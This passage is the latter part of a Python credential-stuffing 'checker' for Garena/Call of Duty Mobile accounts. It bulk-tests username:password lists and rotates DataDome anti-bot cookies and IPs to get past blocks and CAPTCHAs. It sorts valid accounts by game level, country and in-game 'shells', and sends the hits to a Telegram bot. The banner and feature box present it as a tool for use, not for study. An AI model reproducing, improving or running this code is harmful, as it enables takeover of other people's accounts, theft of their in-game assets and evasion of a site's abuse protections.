                                        pbar.write(f"{Fore.GREEN}[💾] New cookie pool saved.{Style.RESET_ALL}")
                                    except IOError as e: pbar.write(f"{Fore.RED}Error saving new cookie pool: {e}{Style.RESET_ALL}")
                                    
                                    pbar.write(f"{Fore.GREEN}[✅] New cookie pool activated. Resuming check...{Style.RESET_ALL}")
                                    break # Exit the menu loop to retry account
                                else:
                                    pbar.write(f"{Fore.RED}[❌] Failed to create a new cookie pool. Please try another option.{Style.RESET_ALL}")
                                    continue # Show menu again

                            elif choice == '2':
                                pbar.write(f"{Fore.YELLOW}[IP] Assuming IP has been changed. Retrying...{Style.RESET_ALL}")
                                break # Exit menu loop to retry account

                            elif choice == '3':
                                if cookie_index + 1 < len(datadome_pool):
                                    cookie_index += 1
                                    current_datadome = datadome_pool[cookie_index]
                                    pbar.write(f"{Fore.CYAN}[🔄] Switched to next cookie ({cookie_index + 1}/{len(datadome_pool)}). Resuming...{Style.RESET_ALL}")
                                    break # Exit menu loop to retry account
                                else:
                                    pbar.write(f"{Fore.RED}[⚠️] No more cookies in the existing pool. Please fetch a new pool (Option 1) or change IP (Option 2).{Style.RESET_ALL}")
                                    continue # Show menu again

                            elif choice == '4':
                                pbar.write(f"{Fore.RED}[🛑] Exiting checker as requested.{Style.RESET_ALL}")
                                should_exit = True
                                break # Exit menu loop

                            else:
                                pbar.write(f"{Fore.RED}Invalid choice. Please enter a number from 1 to 4.{Style.RESET_ALL}")
                        
                        if should_exit:
                            break # Break the main `while` loop
                        else:
                            continue # Continue main `while` loop to retry the current account

                    if isinstance(result, tuple):
                        console_message, telegram_message, codm_level_num, country, user, pwd, shell, has_codm, is_clean = result
                        pbar.write(console_message)
                        stats['successful'] += 1
                        if is_clean: stats['clean'] += 1
                        else: stats['not_clean'] += 1
                        if has_codm:
                            if 1 <= codm_level_num <= 50: stats['level_distribution']["1-50"] += 1
                            elif 51 <= codm_level_num <= 100: stats['level_distribution']["51-100"] += 1
                            elif 101 <= codm_level_num <= 200: stats['level_distribution']["101-200"] += 1
                            elif 201 <= codm_level_num <= 300: stats['level_distribution']["201-300"] += 1
                            elif 301 <= codm_level_num <= 400: stats['level_distribution']["301-400"] += 1
                        else: stats['level_distribution']["No_CODM_Data"] += 1
                        country_key = "Others"
                        for key, keywords in COUNTRY_KEYWORD_MAP.items():
                            if any(keyword in country.upper() for keyword in keywords): country_key = key; break
                        stats['country_counts'][country_key] = stats['country_counts'].get(country_key, 0) + 1
                        if shell and int(shell) > 0:
                            shell_info = f"{user}:{pwd} - Shells: {shell}"
                            if shell_info not in stats['shell_accounts']: stats['shell_accounts'].append(shell_info)
                        if codm_level_num > stats['highest_level']:
                            stats['highest_level'] = codm_level_num
                            stats['highest_level_info'] = f"Level: {codm_level_num} | Country: {country} | User: {user}"
                        if telegram_message and telegram_bot_token and telegram_chat_id:
                            if send_to_telegram(telegram_bot_token, telegram_chat_id, telegram_message): stats['telegram_sent'] += 1
                    else:
                        stats['failed'] += 1; failed_out.write(f"{username}:{password} - {result}\n")
                        if "[🔐]" in result: stats['incorrect_pass'] += 1
                        elif "[😢]" in result: stats['no_exist'] += 1
                        else: stats['other_fail'] += 1
                        pbar.write(f"{Fore.RED}User: {username} | Pass: {password} ➔ {result}{Style.RESET_ALL}")
                else:
                    stats['failed'] += 1; stats['other_fail'] += 1; failed_out.write(f"{acc} - Invalid format\n")
                    pbar.write(f"{Fore.YELLOW}Invalid format: {acc} ➔ Skipping{Style.RESET_ALL}")
                
                pbar.set_postfix_str(f"Success: {Fore.GREEN}{stats['successful']}{Style.RESET_ALL}, WrongPass: {Fore.RED}{stats['incorrect_pass']}{Style.RESET_ALL}, Clean: {Fore.GREEN}{stats['clean']}{Style.RESET_ALL}, Not Clean: {Fore.YELLOW}{stats['not_clean']}{Style.RESET_ALL}, TG Sent: {Fore.BLUE}{stats['telegram_sent']}{Style.RESET_ALL}")
                pbar.update(1)
                account_idx += 1
                save_progress_state(file_path, account_idx, stats) # Save progress after each account
    except FileNotFoundError: print(Fore.RED + "Error: File not found!" + Style.RESET_ALL)
    except Exception as e: print(Fore.RED + f"An unexpected error occurred: {e}" + Style.RESET_ALL)
    finally:
        if pbar: pbar.close()
        is_complete = account_idx >= total_accounts and total_accounts > 0

        print(Fore.GREEN + f"\n\n--- CHECKING COMPLETE ---")
        print(f"Total: {total_accounts} | Success: {stats['successful']} | Failed: {stats['failed']}")
        if stats['captcha_count'] > 0:
            print(f"{Fore.RED}CAPTCHAs Encountered: {stats['captcha_count']}{Style.RESET_ALL}")
        if stats['successful'] > 0:
            print(f"\n{Fore.CYAN}--- LEVEL DISTRIBUTION ---")
            with tqdm(total=len(stats['level_distribution']), desc="Analyzing Levels", bar_format="{desc}: {bar} {percentage:3.0f}%", colour='cyan') as stats_pbar:
                for level_range, count in stats['level_distribution'].items():
                    if count > 0: print(f"  {Fore.CYAN}🎮 Level {level_range:<12} - {Fore.GREEN}{count} hit(s)")
                    stats_pbar.update(1); time.sleep(0.05)
            print(f"\n{Fore.YELLOW}--- COUNTRY DISTRIBUTION ---")
            sorted_countries = sorted(stats['country_counts'].items(), key=lambda item: item[1], reverse=True)
            with tqdm(total=len(sorted_countries), desc="Analyzing Countries", bar_format="{desc}: {bar} {percentage:3.0f}%", colour='yellow') as stats_pbar:
                for country, count in sorted_countries:
                    print(f"  {Fore.YELLOW}🌍 {country:<15} - {Fore.GREEN}{count} hit(s)")
                    stats_pbar.update(1); time.sleep(0.05)
            print(f"\n{Fore.MAGENTA}--- HIGHLIGHTS ---")
            print(f"{Style.BRIGHT}{Fore.CYAN}🏆 Highest Level Account: {stats['highest_level_info']}{Style.RESET_ALL}")
            if stats['shell_accounts']:
                print(f"{Style.BRIGHT}{Fore.GREEN}💰 Accounts with Shells ({len(stats['shell_accounts'])}):{Style.RESET_ALL}")
                for acc in stats['shell_accounts']: print(f"  - {acc}")
            else: print(f"{Style.BRIGHT}{Fore.YELLOW}💰 No accounts with shells found.{Style.RESET_ALL}")

        if is_complete:
            clear_progress_state()
            print(f"\n{Fore.GREEN}[✨] Check completed. Resume state cleared.{Style.RESET_ALL}")
        elif total_accounts > 0:
            print(f"\n{Fore.YELLOW}[⚠️] Check interrupted. Progress saved for '{os.path.basename(file_path)}'. Run the script again to resume.{Style.RESET_ALL}")

        if auto_delete:
            if is_complete:
                try:
                    os.remove(file_path)
                    print(f"\n{Fore.GREEN}[🗑️] All accounts checked. Source file '{os.path.basename(file_path)}' has been deleted.{Style.RESET_ALL}")
                except Exception as e: print(f"\n{Fore.RED}[❌] Failed to delete source file: {e}{Style.RESET_ALL}")
            elif account_idx > 0:
                remaining_accounts = accounts[account_idx:]
                try:
                    with open(file_path, 'w', encoding='utf-8') as f: f.write('\n'.join(remaining_accounts))
                    print(f"\n{Fore.GREEN}[💾] Updated account file. {len(remaining_accounts)} unchecked accounts remain.{Style.RESET_ALL}")
                except Exception as e: print(f"\n{Fore.RED}[❌] Failed to update account file: {e}{Style.RESET_ALL}")
        print('-'*50 + f"\nResults saved to: {get_results_directory()}\nLogs saved to: {get_logs_directory()}")

def find_nearest_account_file():
    keywords = ["garena", "account", "codm", "accounts"]
    for root, _, files in os.walk(os.getcwd()):
        for file in files:
            if file.endswith(".txt") and any(keyword in file.lower() for keyword in keywords): return os.path.join(root, file)
    return os.path.join(os.getcwd(), "accounts.txt")

def remove_duplicates_from_file(file_path):
    """Reads a file, removes duplicate/empty lines, and overwrites the file."""
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f: lines = f.read().splitlines()
        initial_count = len(lines)
        unique_lines = list(OrderedDict.fromkeys(line for line in lines if line.strip()))
        final_count = len(unique_lines)
        removed_count = initial_count - final_count
        if removed_count > 0:
            with open(file_path, 'w', encoding='utf-8') as f: f.write('\n'.join(unique_lines))
            print(f"{Fore.YELLOW}[✨] Removed {removed_count} duplicate/empty line(s) from '{os.path.basename(file_path)}'.{Style.RESET_ALL}")
        return unique_lines, final_count
    except FileNotFoundError: print(f"{Fore.RED}Error: File not found at '{file_path}'.{Style.RESET_ALL}"); return [], 0
    except Exception as e:
        print(f"{Fore.RED}Error processing file for duplicates: {e}{Style.RESET_ALL}")
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f: lines = [line for line in f.read().splitlines() if line.strip()]
        return lines, len(lines)

def display_banner():
    W, GR, R, RED_BG, BOLD_BLUE, CYAN, BOLD_YELLOW = "\033[0m", "\033[90m", "\033[1;31m", "\033[101m", "\033[0;34m\033[1m", "\033[0;36m", "\033[1;33m"
    banner = f"""
{W}{W}            {GR}          :::!~!!!!!:.          {W}
{W}{GR}                  .xUHWH!! !!?M88WHX:.       {W}
{W}{GR}                .X*#M@$!!  !X!M$$$$$WWx:     {W}
{W}{GR}               :!!!!!!?H! :!$!$$$$$$$$$8X:  {W}
{W}{GR}             !!~  ~:~!! :~!$!%$$$$$$$$$$8X:  {W}
{W}{GR}             :!~::!H![   ~.U$X!?W$$$$$$$MM! {W}
{W}{GR}             ~!~!!!!~~ .:XW$$$U!!?$$$$$$WMM! {W}
{W}{GR}               !:~~~ .:!M*T#$$$$WX??#MRRMMM! {W}
{W}{GR}               ~?WuxiW*     *#$$$$8!!!!??!!! {W}
{W}{GR}             :X- M$$$$  {R} 𖣘 {GR}  '#T#$T~!8$WUXU~ {W}
{W}{GR}          :%'  ~%$$$Mm:         ~!~ ?$$$$$$  {W}
{W}{GR}          :! .-   ~T$$$$8xx.  .xWW- ~””##*'' {W}
{W}{GR}  .....   -~~:<  !    ~?T$@@W@*?$$ {R} 𖣘 {GR} /’   {W}
{W}{GR} W$@@M!!! .!~~ !!     .:XUW$W!~ '*~:   :     {W}
{W}{GR} %^~~'.:x%'!!  !H:   !WM$$$$Ti.: .!WUnn!     {W}
{W}{GR} :::~:!. :X~ .: ?H.!u *$$$$$$$!W:U!T$$M~     {W}
{W}{GR} .~~   :X@!.-~   ?@WTWo('*$$$W$TH$!          {W}
{W}{GR} Wi.~!X$?!-~    : ?$$$B$Wu(***$RM!           {W}
{W}{GR} $R@i.#~ !     :   -$$$$$%$Mm$;              {W}
{W}{GR} ?MXT@Wx.~    :     ~##$$$$M~                {W}
{W} 
\033[1m           {R}{W}{R}{BOLD_BLUE}{W}{RED_BG} 𝐏𝐫𝐞𝐬𝐞𝐧𝐭𝐞𝐝 𝐁𝐲: PAPA MO {BOLD_BLUE}{W}{R}\033[0m
"""
    print(banner)
    features = f"""{CYAN}
    ╔══════════════════════════════════════════════════════╗
    ║ {BOLD_YELLOW}                    FEATURES                     {CYAN} ║
    ╟──────────────────────────────────────────────────────╢
    ║ {BOLD_YELLOW}✔ {CYAN}Handles 1k+ Lines with Detailed CODM Info        ║
    ║ {BOLD_YELLOW}✔ {CYAN}Auto-Retry on Network Errors                     ║
    ║ {BOLD_YELLOW}✔ {CYAN}Smart Telegram Alerts (Only for CODM Hits)       ║
    ║ {BOLD_YELLOW}✔ {CYAN}Automatic Duplicate Account Remover              ║
    ║ {BOLD_YELLOW}✔ {CYAN}Sorts Hits by Country & CODM Level               ║
    ║ {BOLD_YELLOW}✔ {CYAN}Detailed End-of-Check Statistics                 ║
    ║ {BOLD_YELLOW}✔ {CYAN}Manages Checked Lines to Prevent Re-checking     ║
    ╚══════════════════════════════════════════════════════╝
    """
    print(features)

def taeee(jarell):
    clear_screen()
    display_banner()

    resume_state = load_progress_state()
    file_path = ""
    start_from_state = False

    if resume_state:
        print(f"\n{Fore.YELLOW}[⚠️] An incomplete session was found!{Style.RESET_ALL}")
        resume_file_path = resume_state.get('file_path')
        if resume_file_path and os.path.exists(resume_file_path):
            try:
                with open(resume_file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    total_lines = sum(1 for _ in f)
                progress_percent = (resume_state.get('next_index', 0) / total_lines) * 100 if total_lines > 0 else 0
            except (IOError, ZeroDivisionError):
                progress_percent = 0
            
            print(f"    File: {Fore.CYAN}{os.path.basename(resume_file_path)}{Style.RESET_ALL}")
            print(f"    Progress: ~{progress_percent:.1f}% complete (Resuming from account #{resume_state.get('next_index', 0) + 1})")
            
            resume_choice = input(f"{Fore.CYAN}Do you want to resume this session? (y/n): {Style.RESET_ALL}").strip().lower()
            
            if resume_choice == 'y':
                file_path = resume_file_path
                start_from_state = True
                print(f"{Fore.GREEN}[▶️] Resuming session...{Style.RESET_ALL}")
            else:
                clear_progress_state()
                print(f"{Fore.RED}[🗑️] Previous session discarded. Starting fresh.{Style.RESET_ALL}")
                resume_state = None
        else:
            print(f"{Fore.RED}[❌] Account file for the saved session could not be found.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[🗑️] Discarding invalid session...{Style.RESET_ALL}")
            clear_progress_state()
            resume_state = None

    saved_token, saved_chat_id = load_telegram_config()
    prompt_token = "Enter Telegram Bot Token"
    if saved_token: prompt_token += f" (saved: {saved_token[:5]}...{saved_token[-4:]}, press Enter to use)"
    new_token = input(f"{Fore.BLUE}{prompt_token}: {Style.RESET_ALL}").strip()
    telegram_bot_token = new_token if new_token else saved_token
    prompt_chat_id = "Enter Telegram Chat ID"
    if saved_chat_id: prompt_chat_id += f" (saved: {saved_chat_id}, press Enter to use)"
    new_chat_id = input(f"{Fore.BLUE}{prompt_chat_id}: {Style.RESET_ALL}").strip()
    telegram_chat_id = new_chat_id if new_chat_id else saved_chat_id
    if telegram_bot_token and telegram_chat_id:
        print(f"{Fore.GREEN}[✅] Telegram notifications enabled.{Style.RESET_ALL}")
        if (new_token and new_token != saved_token) or (new_chat_id and new_chat_id != saved_chat_id): save_telegram_config(telegram_bot_token, telegram_chat_id)
    else:
        print(f"{Fore.RED}[❌] Token or Chat ID is missing. Telegram notifications disabled.{Style.RESET_ALL}")
        telegram_bot_token, telegram_chat_id = None, None
    print(f"\n{Fore.CYAN}--- Select Cookie Source ---{Style.RESET_ALL}")
    print(f"[1] change_cookie.py (Default)"); print(f"[2] ken_cookie.py")
    cookie_choice = input("Enter choice [1-2]: ").strip()
    selected_cookie_module = ken_cookie if cookie_choice == '2' else change_cookie
    print(f"{Fore.GREEN}Using cookies from: {selected_cookie_module.__name__}.py{Style.RESET_ALL}")

    if not start_from_state:
        scan_dir, found_files = "/storage/emulated/0/trese/private", []
        if os.path.isdir(scan_dir):
            try:
                for filename in os.listdir(scan_dir):
                    if filename.endswith(".txt"):
                        file_path_scan = os.path.join(scan_dir, filename)
                        try:
                            with open(file_path_scan, 'r', encoding='utf-8', errors='ignore') as f: line_count = sum(1 for _ in f)
                            found_files.append({"path": file_path_scan, "name": filename, "lines": line_count})
                        except Exception: continue
            except (PermissionError, OSError): pass

        if found_files:
            print(f"\n{Fore.GREEN}[+] Found account files:{Style.RESET_ALL}")
            for i, file_info in enumerate(found_files): print(f"  {Fore.YELLOW}[{i+1}]{Style.RESET_ALL} {file_info['name']} ({file_info['lines']} accounts)")
            prompt_message = "\nEnter file number, custom path, or Enter to auto-find: "
        else: prompt_message = "\nEnter path to .txt file or Enter to auto-find: "
        
        user_input = input(prompt_message).strip()
        if user_input.isdigit() and found_files and 0 < int(user_input) <= len(found_files): file_path = found_files[int(user_input) - 1]['path']
        elif user_input: file_path = user_input
        else: file_path = find_nearest_account_file()
    
    if not os.path.isfile(file_path) or not file_path.endswith('.txt'): print(f"{Fore.RED}File not found or invalid: '{file_path}'.{Style.RESET_ALL}"); return
    
    auto_delete = False
    delete_choice = input(f"\n{Fore.YELLOW}Do you want to auto-manage the source file? (y/n): {Style.RESET_ALL}").strip().lower()
    if delete_choice == 'y':
        auto_delete = True
        print(f"{Fore.YELLOW}[⚠️] Auto-manage enabled. Checked lines will be removed on exit. The file will be deleted entirely upon successful completion.{Style.RESET_ALL}")
    
    input("\nPress Enter to start the bulk check...")
    bulk_check(file_path, telegram_bot_token, telegram_chat_id, selected_cookie_module, auto_delete, resume_state if start_from_state else None)

if __name__ == "__main__":
    try:
        taeee("jarell")
    except KeyboardInterrupt:
        print(f"\n{RED}Exiting program...{RESET}")
        sys.exit(0)